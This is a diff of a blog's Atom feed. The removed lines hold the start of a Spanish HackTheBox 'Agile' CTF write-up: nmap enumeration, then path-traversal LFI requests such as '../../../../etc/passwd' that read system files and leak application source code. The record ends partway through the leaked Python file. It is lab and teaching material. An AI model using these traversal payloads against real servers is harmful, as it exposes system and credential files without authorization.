@@ -1,390 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-25T16:36:16-06:00</updated><id>http://localhost:4000/</id><title>c4rta</title><subtitle>Un chico que le gusta la informatica</subtitle><entry><title>HackTheBox Agile - LFI, IDOR y sudoedit</title><link href="http://localhost:4000/htb-agile/" rel="alternate" type="text/html" title="HackTheBox Agile - LFI, IDOR y sudoedit" /><published>2023-07-25T00:00:00-06:00</published><updated>2023-07-25T00:00:00-06:00</updated><id>http://localhost:4000/htb-agile</id><content type="html" xml:base="http://localhost:4000/htb-agile/">&lt;p class=&quot;lead&quot;&gt;Tenemos un sitio web que sirve como vaul de contraseñas donde descubriremos que es vulnerable a LFI a la hora de exportar las contraseñas, ese mismo LFI lo aprovecharemos para filtrar un archivo de la aplicacion mediante un error de incluir una ruta que no existe, despues mediante IDOR vamos a poder ver las credenciales del usuario corum, despues haremos port forwarding para traernos un puerto y descubriremos el mismo sitio web donde obtendremos las credenciales de edwards, y para la escalada nos aprovecharemos de una vulnerabilidad de sudoedit mediante la variable de entorno EDITOR&lt;/p&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con un escaneo de nmap con:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.11.203
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;n: para que no haga resolucion DNS y tarde menos el escaneo&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Pn: para evitar el descubrimiento de hosts&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;open: para que solo muestre los puertos abiertos&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;-p-: para que escanee todo el rango de puertos&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y nos reporto dos puertos abiertos 22(SSH) y 80(HTTP)&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.11.203 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Did not follow redirect to http://superpass.htb
-|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Obtenemos que estamos contra un Ubuntu, el servidor web que usa en nginx y el http-title nos dice que nos esta redireccionado a un dominio: &lt;code class=&quot;highlighter-rouge&quot;&gt;http-title: Did not follow redirect to http://superpass.htb&lt;/code&gt;, asi que lo agregamos el etc/hosts&lt;/p&gt;
-
-&lt;h3 id=&quot;investigando-el-sitio-web&quot;&gt;Investigando el sitio web&lt;/h3&gt;
-
-&lt;p&gt;El sitio web parace ser un administrador de contraseñas con el nombre &lt;code class=&quot;highlighter-rouge&quot;&gt;SuperPassword&lt;/code&gt;, si le damos en el apartado de login nos mandara a un panel de inicio de sesion y registro&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si intentamos evadir el login con SQLi no va por ahi, asi que simplemente nos registraremos, vemos como nos muestra un vaul de contraseñas donde podemos agregarlas y exportarlas&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si le damos en exportar veremos que nos descarga un archivo .csv&lt;/p&gt;
-
-&lt;h2 id=&quot;local-file-inclusion-lfi&quot;&gt;Local File Inclusion (LFI)&lt;/h2&gt;
-
-&lt;p&gt;Si interceptamos la peticion cuando le damos en exportar archivo podemos ver que en el parametro &lt;code class=&quot;highlighter-rouge&quot;&gt;download&lt;/code&gt; se esta incluyendo el archivo csv&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Por la menera en la que lo esta haciendo podriamos pensar en un LFI, asi que probaremos&lt;/p&gt;
-
-&lt;p&gt;Si lo hacemos directamente indicandole el archivo de esta manera no vamos a poder&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /download?fn&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/passwd HTTP/1.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos dira que el archivo o directorio no se existe:&lt;/p&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;errormsg&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;FileNotFoundError: [Errno 2] No such file or directory: &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;/tmp/etc/passwd&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Asi que usaremos directory path traversal de esta forma:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /download?fn&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../etc/passwd HTTP/1.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y ya nos muestra el contenido del archivo y tambien podemos ver que existe el usuario &lt;code class=&quot;highlighter-rouge&quot;&gt;corum&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;runner&lt;/code&gt; y &lt;code class=&quot;highlighter-rouge&quot;&gt;edwards&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues de probar algunas cosas me decidi volver a probar esto pero esta vez, ver mas a detalle los errores:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /download?fn&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/passwd HTTP/1.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Antes veiamos que si tratabamos de indicarle de esa forma el /etc/passwd nos daba un error, pues cuando ocasiona ese error tambien se filtran rutas de la aplicacion&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Asi que me di cuenta que a indicarle una ruta que no existe nos filtra informacion de la aplicacion, como se ve en este otro caso que le indice esto:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /download?fn&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../nose HTTP/1.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/agile/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues de ver un rato, un archivo interesante es este &lt;code class=&quot;highlighter-rouge&quot;&gt;/app/app/superpass/views/vault_views.py&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a mostrar su contenido de esta forma:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /download?fn&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../app/app/superpass/views/vault_views.py 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask_login&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login_required&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;superpass.infrastructure.view_modifiers&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;superpass.services.password_service&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;superpass.services.utility_service&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_random&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;superpass.data.password&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Password&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;blueprint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;template_folder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'templates'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/vault.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_passwords_for_user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'{passwords=}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'passwords'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/add_row'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/partials/password_row_editable.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/edit_row/&amp;lt;id&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/partials/password_row_editable.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_edit_row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_password_by_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/row/&amp;lt;id&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template_file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'vault/partials/password_row.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_password_by_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;p&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@blueprint.post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/vault/add_row'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_row_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;site&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'url'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;site&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password_service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
